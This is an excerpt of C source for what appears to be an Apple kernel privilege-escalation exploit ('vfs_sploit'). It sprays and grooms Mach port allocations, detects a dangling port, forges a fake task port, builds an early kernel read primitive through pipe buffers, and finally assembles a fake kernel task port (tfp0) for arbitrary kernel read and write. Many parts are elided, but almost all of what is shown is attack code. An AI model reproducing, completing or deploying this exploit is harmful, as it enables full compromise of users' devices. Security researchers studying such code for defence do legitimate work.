...
static void
build_fake_task_port (uint8_t * fake_port, uint64_t fake_port_kaddr,
		      uint64_t initial_read_addr, uint64_t vm_map,
		      uint64_t receiver, uint64_t context)
{
  ...
  *(uint64_t *) (fake_port + koffset (KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER)) =
    receiver;
  *(uint64_t *) (fake_port + koffset (KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)) =
    context;

  uint64_t fake_task_kaddr = fake_port_kaddr + 0x100;
  *(uint64_t *) (fake_port + koffset (KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) =
    fake_task_kaddr;
  ...
  *(uint8_t *) (fake_task + koffset (KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) =
    0x22;

  // set the bsd_info pointer to be 0x10 bytes before the desired initial read:
  *(uint64_t *) (fake_task + koffset (KSTRUCT_OFFSET_TASK_BSD_INFO)) =
    initial_read_addr - 0x10;
}
...
alloc_early_ports ()
{
  for (int i = 0; i < N_EARLY_PORTS; i++)
	...
	{
	  LOG
	    ("mach_port_allocate failed to allocate a new port for early_ports (%d)",
	     i);
	}
    }
...
kalloc_16 ()
{
  ...
  // send it:
  err = mach_msg (&kalloc_msg.hdr, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, (mach_msg_size_t) msg_size,	//sizeof(struct kalloc_16_send_msg),
...
mach_port_t
hold_kallocs (uint32_t kalloc_size, int allocs_per_message,
	      int messages_to_send, mach_port_t holder_port,
	      mach_port_t * source_ports)
{
  ...
  mach_port_t *ports_to_send =
    calloc (kalloc_size / 8, sizeof (mach_port_name_t));

  size_t message_size =
    offsetof (struct ool_multi_msg, ool_ports[allocs_per_message + 1]);
  ...
  for (int i = 0; i < allocs_per_message; i++)
    {
      msg->ool_ports[i].address =
	source_ports != NULL ? source_ports : ports_to_send;
...
void
discard_message (mach_port_t port)
{
  mach_msg_header_t *msg = (mach_msg_header_t *) msg_buf;
  kern_return_t err;
  err = mach_msg (msg, MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE,	// no timeout
		  0, 10000, port, 0, 0);
  if (err != KERN_SUCCESS)
    {
...
// read_fd and write_fd are the pipe fds which have a pipe buffer at knownaddr
static void
prepare_early_read_primitive (mach_port_t target_port, int read_fd,
			      int write_fd, uint64_t known_kaddr)
{
...
vfs_sploit ()
{
  ...
  if (kernel_page_size == 0x1000)
    {
      mach_port_t initial_kallocs_holder =
	hold_kallocs (0x10, 100, 100, MACH_PORT_NULL, NULL);
    }
  ...
  for (int i = 0; i < kallocs_per_zcram; i++)
    {
      ...
      for (int j = first_candidate_port_index; j < last_candidate_port_index;
	   j++)
	{
...
#define CANARY_REGION 4
  ...
  for (int i = 0; i < next_middle_port; i++)
      ...
      if (port == target_port)
	{
	  ...
	  int new_size = 100;
	  kern_return_t err =
	    mach_port_set_attributes (mach_task_self (), target_port,
				      MACH_PORT_DNREQUESTS_SIZE,
				      (mach_port_info_t) & new_size,
				      sizeof (int));
	  if (err != KERN_SUCCESS)
	    {
...
#define N_COLLECTABLES 3
  ...
  for (int i = 0; i < N_COLLECTABLES; i++)
    {
      collectable_ports[i] =
	hold_kallocs (0x800, 0x3e, 400, MACH_PORT_NULL, NULL);
    }
  ...
  mach_port_insert_right (mach_task_self (), canary_port, canary_port,
			  MACH_MSG_TYPE_MAKE_SEND);
  ...
  replacer_object[koffset (KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT) / 8] =
    canary_port;
  ...
  for (int i = 0; i < n_gc_ports; i++)
    {
      gc_ports[i] =
	hold_kallocs (0x1000, 0x1f, 8, MACH_PORT_NULL, replacer_object);
      LOG ("gc tick %d", i);
      pthread_yield_np ();
      usleep (10000);
    }
  ...
  kern_return_t err;
  err =
    mach_port_get_context (mach_task_self (), target_port,
			   &canary_port_kaddr);
  ...
  err =
    mach_port_set_context (mach_task_self (), target_port,
			   fake_canary_kport_addr);


  size_t pipe_buffer_size = 0xfff;
  uint8_t *pipe_buf = malloc (0x1000);
  memset (pipe_buf, 0, 0x1000);

  uint64_t pipe_target_kaddr_offset =
    kernel_page_size == 0x4000 ? 0x20000 : 0x10000;
  ...
  build_fake_task_port (pipe_buf, pipe_target_kaddr, pipe_target_kaddr, 0, 0,
			0);
  ...
  for (int i = 0; i < n_gc_ports; i++)
	...
	{
	  err = mach_msg (&msg.hdr,
			  MACH_RCV_MSG, 0, sizeof (msg), gc_port, 0, 0);
	  if (err != KERN_SUCCESS)
	    {
	      LOG ("failed to receive OOL_PORTS message (%d,%d) %s", i, j,
		   mach_error_string (err));
	    }
	  ...
	  for (int k = 0; k < 0x1f; k++)
	    {
	      ...
	      mach_port_t tester_port =
		ool_ports[koffset (KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT) / 8];
      ...
      if (!hit_dangler)
	{
	  secondary_leaker_ports[i] =
	    hold_kallocs (0x1000, 0x1f, 8, MACH_PORT_NULL, NULL);
	}
      else
	{
	  if (dangler_hits == 14)
	  ...
	  for (int i = 0; i < (0x1f * 8); i++)
	      ...
	      if (err != 0)
		{
	      ...
	      build_fake_task_port (pipe_buf, pipe_target_kaddr,
  ...
  prepare_early_read_primitive (target_port,
				read_ends[pipe_target_kaddr_replacer_index],
				write_ends[pipe_target_kaddr_replacer_index],
				pipe_target_kaddr);

  mach_msg_header_t host_msg = { 0 };
  host_msg.msgh_bits =
    MACH_MSGH_BITS (MACH_MSG_TYPE_MAKE_SEND, MACH_MSG_TYPE_COPY_SEND);
  ...
  LOG
    ("sent host_msg to canary port, let's find it and locate the host port");
  uint64_t host_kmsg =
    early_rk64 (canary_port_kaddr +
		koffset (KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
  ...
  LOG
    ("sent task_msg to canary port, let's find it and locate the host port");
  ...
  for (int i = 0; i < ports_per_zcram; i++)
    {
      ...
      uint32_t io_bits =
	early_rk32 (early_port_kaddr +
		    koffset (KSTRUCT_OFFSET_IPC_PORT_IO_BITS));
      ...
      if (task_t == 0)
	{
      ...
      uint64_t bsd_info =
	early_rk64 (task_t + koffset (KSTRUCT_OFFSET_TASK_BSD_INFO));
      if (bsd_info == 0)
	{
      ...
      uint32_t pid =
	early_rk32 (bsd_info + koffset (KSTRUCT_OFFSET_PROC_PID));
      if (pid != 0)
	{
      ...
      kernel_vm_map =
	early_rk64 (task_t + koffset (KSTRUCT_OFFSET_TASK_VM_MAP));
      break;
    }
  ...
  uint64_t task_kaddr =
    early_rk64 (task_port_kaddr +
		koffset (KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  uint64_t itk_space =
    early_rk64 (task_kaddr + koffset (KSTRUCT_OFFSET_TASK_ITK_SPACE));
  uint64_t is_table =
    early_rk64 (itk_space + koffset (KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));

  const int sizeof_ipc_entry_t = 0x18;
  uint64_t target_port_kaddr =
    early_rk64 (is_table + ((target_port >> 8) * sizeof_ipc_entry_t));
  ...
  build_fake_task_port (fake_tfp0_buf, target_port_kaddr, 0x4242424243434343,
			kernel_vm_map, ipc_space_kernel, 0x1234);
  ...
  WriteKernel64 (is_table + ((fake_canary_port >> 8) * sizeof_ipc_entry_t),
		 0);
  WriteKernel64 (is_table + ((fake_canary_port >> 8) * sizeof_ipc_entry_t) +
		 8, 0);
  ...
  uint64_t proc_addr =
    ReadKernel64 (task_kaddr + koffset (KSTRUCT_OFFSET_TASK_BSD_INFO));
  uint64_t filedesc =
    ReadKernel64 (proc_addr + koffset (KSTRUCT_OFFSET_PROC_P_FD));
  uint64_t ofiles_base =
    ReadKernel64 (filedesc + koffset (KSTRUCT_OFFSET_FILEDESC_FD_OFILES));
  uint64_t ofiles_offset = ofiles_base + (target_port_read_fd * 8);
  uint64_t fileproc = ReadKernel64 (ofiles_offset);
  uint64_t fileglob =
    ReadKernel64 (fileproc + koffset (KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
  uint64_t pipe =
    ReadKernel64 (fileglob + koffset (KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
  ...
  LOG
    ("keep hold of a send right to it; don't expect this exploit to work again without a reboot");
